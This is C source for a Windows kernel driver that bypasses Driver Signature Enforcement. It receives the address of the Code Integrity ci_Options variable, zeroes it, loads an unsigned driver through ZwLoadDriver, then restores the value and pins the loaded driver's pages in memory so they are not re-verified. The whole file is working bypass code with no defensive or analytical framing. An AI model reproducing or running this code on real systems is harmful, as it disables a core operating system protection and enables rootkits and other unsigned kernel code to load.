#include <ntifs.h>
#include <ntimage.h>
#define _DRIVER
#include "defs.h"

//
// What follows is the meat of the whole DSE bypass.
//
// We temporarily flip the ci_Options to not validate, load driver, flip
// ci_options back.
//
// BUT. Compared to linux, driver pages can be swapped out to disk on windows.
// Worse still, windows will sneakily re-verify pages as they get paged back in.
//
// Obviously our image would fail as the pages will not validate. What we do
// is register a callback for image loading. In there, enumerate all driver sections,
// and lock em in memory via calls to MmLockPagableDataSection -- all the while
// ci_Options is still zero so that everything can be paged in.

#define STDCALL __stdcall

static UCHAR *ciptr;
static UCHAR *ciorigptr;
static KMUTEX ioctl_mutex;

static void lock_driver(void *base)
{
	IMAGE_DOS_HEADER *mz = base;
	IMAGE_NT_HEADERS *pe = base + mz->e_lfanew;
	IMAGE_SECTION_HEADER *sec = ((void*)pe) + sizeof(IMAGE_NT_HEADERS);
	DBG("Locking driver @ %p\n", base);
	for (int i = 0; i < pe->FileHeader.NumberOfSections; i++) {
		if (sec[i].SizeOfRawData && sec[i].PointerToRawData) {
			DBG("Locking section %p\n",base + sec[i].VirtualAddress);
			MmLockPagableDataSection(base + sec[i].VirtualAddress);
		}
	}
}

static void NTAPI image_notify(PUNICODE_STRING filename, HANDLE pid, PIMAGE_INFO pinfo)
{
	if (!pinfo->SystemModeImage)
		return;
	lock_driver(pinfo->ImageBase);
}

static void ci_restore()
{
	UCHAR orig;
	orig = (UCHAR)(ULONG_PTR)ciorigptr;
	if (ciorigptr > (UCHAR*)0xff)
		orig = *ciorigptr;
	*ciptr = orig;
	DBG("restoring ci_Options@%p to 0x%02hhx, dword=%08x\n",ciptr,orig,*((ULONG*)ciptr));
}

static NTSTATUS driver_sideload(PUNICODE_STRING svc)
{
	NTSTATUS status;

	// register notifier routine
	PsSetLoadImageNotifyRoutine(&image_notify);

	// Clear ci_Options. Daaaaanger zone.
	*ciptr = 0;

	// Now go fetch.
	status = ZwLoadDriver(svc);

	// Restore ci_Options.
	ci_restore();

	// Remove notifier
	PsRemoveLoadImageNotifyRoutine(&image_notify);

	return status;
}

// The rest is just boring driver boilerplate...

static VOID STDCALL dev_unload(IN PDRIVER_OBJECT self)
{
	DBG("unloading!\n");
	IoDeleteDevice(self->DeviceObject);
}

static NTSTATUS STDCALL dev_open(IN PDEVICE_OBJECT dev, IN PIRP irp)
{
#if 0
	NTSTATUS status = STATUS_NO_SUCH_FILE;
	irp->IoStatus.Information = FILE_DOES_NOT_EXIST;
	// pretend we don't exist if the caller is unprivileged...
	if (SeSinglePrivilegeCheck(LUID_SeLoadDriverPrivilege, irp->RequestorMode)) {
		status = STATUS_SUCCESS;
		irp->IoStatus.Information = FILE_OPENED;
	}
	irp->IoStatus.Status = status;
	IoCompleteRequest(irp, IO_NO_INCREMENT);
	return status;
#endif
	irp->IoStatus.Status = STATUS_SUCCESS;
	irp->IoStatus.Information = 0;
	IoCompleteRequest(irp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;

}

static NTSTATUS STDCALL dev_control(IN PDEVICE_OBJECT dev, IN PIRP irp)
{
	PIO_STACK_LOCATION io_stack;
	ULONG code;
	NTSTATUS status;
	void *buf;
	int len;

	KeWaitForMutexObject(&ioctl_mutex, UserRequest, KernelMode, FALSE, NULL);

	io_stack = IoGetCurrentIrpStackLocation(irp);
       	status = STATUS_NOT_IMPLEMENTED;
	if (!io_stack)
		goto out;

	buf = irp->AssociatedIrp.SystemBuffer;
	len = io_stack->Parameters.DeviceIoControl.InputBufferLength;
	code = io_stack->Parameters.DeviceIoControl.IoControlCode;

	irp->IoStatus.Information = 0;

	status = STATUS_PRIVILEGE_NOT_HELD;
	if (!SeSinglePrivilegeCheck(LUID_SeLoadDriverPrivilege, irp->RequestorMode))
		goto out;

	status = STATUS_INVALID_BUFFER_SIZE;
	DBG("code=%08x\n",(unsigned)code);
	if (code == IOCTL_SETUP) {
		void **setup = (void*)buf;
		if (len < sizeof(ULONG_PTR)*2)
			goto out;

		status = STATUS_INTERNAL_ERROR;
		if (ciptr || !setup[0])
			goto out;

		ciptr = setup[0];
		ciorigptr = setup[1];
		DBG("setup %p %p\n",ciptr,ciorigptr);
		ci_restore();
		status = STATUS_SUCCESS;
	} else if (code == IOCTL_INSMOD) {
		UNICODE_STRING us;

		// must be at least 2 long, must be even, must terminate with 0
		if ((len < 2) || (len&1) || (*((WCHAR*)(buf+len-2))!=0))
			goto out;

		us.Buffer = buf;
		us.Length = len-2;
		us.MaximumLength = len;

		status = STATUS_INTERNAL_ERROR;
		if (!ciptr)
			goto out;

		status = driver_sideload(&us);
	}
out:;
	KeReleaseMutex(&ioctl_mutex, 0);
	irp->IoStatus.Status = status;
	IoCompleteRequest(irp, IO_NO_INCREMENT);
	return status;
}

NTSTATUS STDCALL ENTRY(driver_entry)(IN PDRIVER_OBJECT self, IN PUNICODE_STRING reg)
{
	PDEVICE_OBJECT dev;
	NTSTATUS status;

	self->DriverUnload = dev_unload;
	self->MajorFunction[IRP_MJ_CREATE] = dev_open;
	self->MajorFunction[IRP_MJ_DEVICE_CONTROL] = dev_control;

	status = IoCreateDevice(self, 0, &RTL_STRING(L"\\Device\\" IO_DEVNAME),
			FILE_DEVICE_UNKNOWN, 0, 0, &dev);

	if (!NT_SUCCESS(status)) {
		DBG("failed to create device=%08x\n",(unsigned)status);
		return status;
	}

	dev->Flags |= METHOD_BUFFERED;
	dev->Flags &= ~DO_DEVICE_INITIALIZING;

	KeInitializeMutex(&ioctl_mutex, 0);

	DBG("loaded driver\n");
	// Page ourselves in too, just in case.
	lock_driver(self->DriverStart);
	return status;
}

